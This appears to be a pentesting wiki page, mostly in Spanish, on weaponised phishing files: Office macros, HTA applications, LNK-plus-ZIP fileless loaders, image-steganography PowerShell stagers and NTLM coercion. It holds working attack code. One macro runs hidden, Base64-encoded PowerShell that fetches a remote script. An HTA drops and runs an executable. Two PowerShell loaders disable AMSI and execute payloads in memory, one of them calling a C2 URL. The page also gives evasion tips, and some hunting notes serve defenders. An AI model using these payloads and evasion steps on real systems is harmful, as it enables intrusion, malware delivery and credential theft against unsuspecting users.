# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word realiza la validación de datos del archivo antes de abrirlo. La validación de datos se realiza mediante la identificación de la estructura de datos, conforme al estándar OfficeOpenXML. Si ocurre algún error durante la identificación de la estructura de datos, el archivo que se está analizando no se abrirá.

Normalmente, los archivos de Word que contienen macros usan la extensión `.docm`. Sin embargo, es posible renombrar el archivo cambiando la extensión y mantener sus capacidades de ejecución de macros.\
Por ejemplo, un archivo RTF no admite macros, por diseño, pero un archivo DOCM renombrado a RTF será manejado por Microsoft Word y podrá ejecutar macros.\
Los mismos mecanismos internos se aplican a todo el software de la Microsoft Office Suite (Excel, PowerPoint, etc.).

Puedes usar el siguiente comando para comprobar qué extensiones serán ejecutadas por algunos programas de Office:
```bash
assoc | findstr /i "word excel powerp"
```
Los archivos DOCX que referencian una plantilla remota (File –Options –Add-ins –Manage: Templates –Go) que incluye macros también pueden "ejecutar" macros.

### Carga de imagen externa

Ir a: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, y **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Es posible usar macros para ejecutar código arbitrario desde el documento.

#### Funciones de autocarga

Cuanto más comunes sean, más probable será que el AV las detecte.

- AutoOpen()
- Document_Open()

#### Ejemplos de código de macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Eliminar manualmente los metadatos

Ve a **File > Info > Inspect Document > Inspect Document**, lo que abrirá el Document Inspector. Haz clic en **Inspect** y luego en **Remove All** junto a **Document Properties and Personal Information**.

#### Extensión Doc

Al terminar, en el desplegable **Save as type**, cambia el formato de **`.docx`** a **Word 97-2003 `.doc`**.\
Haz esto porque no puedes guardar macros dentro de un `.docx` y existe un estigma alrededor de la extensión habilitada para macros **`.docm`** (p. ej., el icono en miniatura muestra un enorme `!` y algunos gateways web/correo las bloquean por completo). Por lo tanto, esta extensión legada **`.doc`** es la mejor solución de compromiso.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Archivos HTA

Una HTA es un programa de Windows que **combina HTML y lenguajes de scripting (como VBScript y JScript)**. Genera la interfaz de usuario y se ejecuta como una aplicación "totalmente confiable", sin las restricciones del modelo de seguridad de un navegador.

Una HTA se ejecuta usando **`mshta.exe`**, que normalmente está **instalado** junto con **Internet Explorer**, lo que hace que **`mshta` dependa de IE**. Por lo tanto, si este ha sido desinstalado, las HTA no podrán ejecutarse.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forzando NTLM Authentication

Hay varias formas de **forzar NTLM authentication "remotely"**, por ejemplo, puedes añadir **imágenes invisibles** en correos electrónicos o HTML a los que el usuario accederá (¿incluso HTTP MitM?). O enviar a la víctima la **dirección de archivos** que **trigger** una **authentication** solo por **abrir la carpeta.**

**Consulta estas ideas y más en las siguientes páginas:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

No olvides que no solo puedes robar el hash o la authentication, sino también **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campañas altamente efectivas entregan un ZIP que contiene dos documentos señuelo legítimos (PDF/DOCX) y un .lnk malicioso. El truco es que el cargador PowerShell real está almacenado dentro de los bytes crudos del ZIP después de un marcador único, y el .lnk lo extrae y ejecuta completamente en memoria.

Flujo típico implementado por el .lnk PowerShell one-liner:

1) Localiza el ZIP original en rutas comunes: Desktop, Downloads, Documents, %TEMP%, %ProgramData% y el directorio padre del directorio de trabajo actual.
2) Lee los bytes del ZIP y encuentra un marcador hardcoded (p. ej., xFIQCV). Todo lo que esté después del marcador es la embedded PowerShell payload.
3) Copia el ZIP a %ProgramData%, extráelo allí y abre el .docx señuelo para aparentar legitimidad.
4) Bypass AMSI para el proceso actual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate la siguiente etapa (p. ej., eliminar todos los caracteres #) y ejecútala en memoria.

Ejemplo de esqueleto PowerShell para extraer y ejecutar la etapa embebida:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- La entrega a menudo abusa de subdominios PaaS reputados (por ejemplo, *.herokuapp.com) y puede condicionar los payloads (servir ZIPs benignos según IP/UA).
- La etapa siguiente frecuentemente descifra shellcode base64/XOR y lo ejecuta vía Reflection.Emit + VirtualAlloc para minimizar artefactos en disco.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Archivos ZIP que contienen la cadena marcador ASCII (p. ej., xFIQCV) anexada a los datos del archivo.
- .lnk que enumera carpetas parent/user para localizar el ZIP y abre un documento señuelo.
- AMSI tampering vía [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads que terminan con enlaces alojados bajo dominios PaaS de confianza.

## Steganography-delimited payloads in images (PowerShell stager)

Cadenas de loader recientes entregan un JavaScript/VBS ofuscado que decodifica y ejecuta un PowerShell stager en Base64. Ese stager descarga una imagen (a menudo GIF) que contiene una .NET DLL codificada en Base64 oculta como texto plano entre marcadores únicos de inicio/fin. El script busca estos delimitadores (ejemplos observados en la naturaleza: «<<sudo_png>> … <<sudo_odt>>>»), extrae el texto intermedio, lo decodifica de Base64 a bytes, carga el assembly en memoria e invoca un método de entrada conocido pasando la URL C2.

Workflow
- Stage 1: Archived JS/VBS dropper → decodifica Base64 embebido → lanza el PowerShell stager con -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → descarga la imagen, extrae el Base64 delimitado por marcadores, carga la .NET DLL en memoria y llama a su método (p. ej., VAI) pasando la URL C2 y opciones.
- Stage 3: El loader recupera el payload final y típicamente lo inyecta vía process hollowing en un binario de confianza (comúnmente MSBuild.exe). Ver más sobre process hollowing y trusted utility proxy execution aquí:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>Extractor y cargador de payload stego en PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notas
- This is ATT&CK T1027.003 (steganography/marker-hiding). Los marcadores varían entre campañas.
- AMSI/ETW bypass y la desofuscación de cadenas se aplican comúnmente antes de cargar el assembly.
- Hunting: escanear imágenes descargadas en busca de delimitadores conocidos; identificar PowerShell que accede a imágenes y decodifica inmediatamente blobs Base64.

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Una etapa inicial recurrente es un pequeño `.js` o `.vbs` fuertemente ofuscado entregado dentro de un archivo. Su único propósito es decodificar una cadena Base64 embebida y lanzar PowerShell con `-nop -w hidden -ep bypass` para arrancar la siguiente etapa vía HTTPS.

Skeleton logic (abstract):
- Leer el contenido del propio archivo
- Localizar un blob Base64 entre cadenas junk
- Decodificar a PowerShell ASCII
- Ejecutar con `wscript.exe`/`cscript.exe` invocando `powershell.exe`

Pistas para hunting
- Adjuntos JS/VBS archivados que lanzan `powershell.exe` con `-enc`/`FromBase64String` en la línea de comandos.
- `wscript.exe` lanzando `powershell.exe -nop -w hidden` desde rutas temp del usuario.

## Windows files to steal NTLM hashes

Consulta la página sobre **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
